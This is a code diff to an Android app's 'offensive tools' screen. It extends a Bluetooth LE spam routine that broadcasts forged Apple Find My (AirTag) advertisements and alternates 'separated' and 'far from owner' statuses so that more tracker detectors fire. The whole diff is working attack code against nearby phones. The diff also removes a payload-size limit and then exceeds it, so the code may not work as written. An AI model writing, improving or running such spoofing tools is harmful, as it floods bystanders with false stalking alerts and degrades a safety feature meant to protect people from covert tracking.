@@ -753,27 +753,44 @@ class OffensiveToolsActivity : Activity() {
     }
 
     // ─── PHANTOM FLOOD (AirTag Spam) ───
-    // Android BLE ad max payload: 31 bytes total (including AD structure overhead)
-    // Manufacturer data: 2 bytes company ID + payload bytes + 2 bytes AD header = max ~24 payload bytes
-    // Keep payload under 22 bytes to be safe across all Android versions
+    // Alternates between two AirTag-style Find My variants per tick so
+    // more classes of detector light up: OpenHaystack-style "separated
+    // from owner" and "far from owner" broadcasts.
+    private var phantomTickIndex = 0
     private fun startPhantomFlood() {
+        phantomTickIndex = 0
         val runnable = object : Runnable {
             override fun run() {
                 if (!isAttacking) return
 
                 val rand = java.util.Random()
+                val channel = phantomTickIndex % 2
+                phantomTickIndex++
 
-                // Apple Find My "Nearby" advertisement.
-                // [0]=type 0x12, [1]=TLV length of bytes after this header,
-                // [2]=status 0x10 separated, [3..] random key fragment.
-                val payload = ByteArray(25)
+                // Two Find My variants. Both use Apple mfg ID 0x004C and
+                // Continuity type 0x12. Differences: status byte + hint.
+                //
+                // channel 0: OpenHaystack-style separated-from-owner
+                //   [2]=0x00 status, [3..24]=22 key bytes, [25]=hint (key[0]),
+                //   [26]=0x00 reserved. Total 27 bytes.
+                // channel 1: Far-from-owner / lost mode variant
+                //   [2]=0x04 status, [3..24]=22 key bytes, [25]=hint,
+                //   [26]=0x10 extended flags. Total 27 bytes.
+                val payload = ByteArray(27)
                 payload[0] = 0x12
-                payload[1] = (payload.size - 2).toByte()
-                payload[2] = 0x10
-                for (i in 3 until payload.size) payload[i] = rand.nextInt(256).toByte()
+                payload[1] = 0x19
+                payload[2] = if (channel == 0) 0x00 else 0x04.toByte()
+                for (i in 3 until 25) payload[i] = rand.nextInt(256).toByte()
+                payload[25] = payload[3]
+                payload[26] = if (channel == 0) 0x00 else 0x10.toByte()
 
                 val data = BleAdvertiseHelper.buildManufacturerData(0x004C, payload)
                 safeAdvertise(data)
+
+                runOnUiThread {
+                    val label = if (channel == 0) "separated" else "far"
+                    packetsText?.text = "Phantom: $packetCount | ch$channel $label"
+                }
 
                 handler.postDelayed(this, 1500)
             }
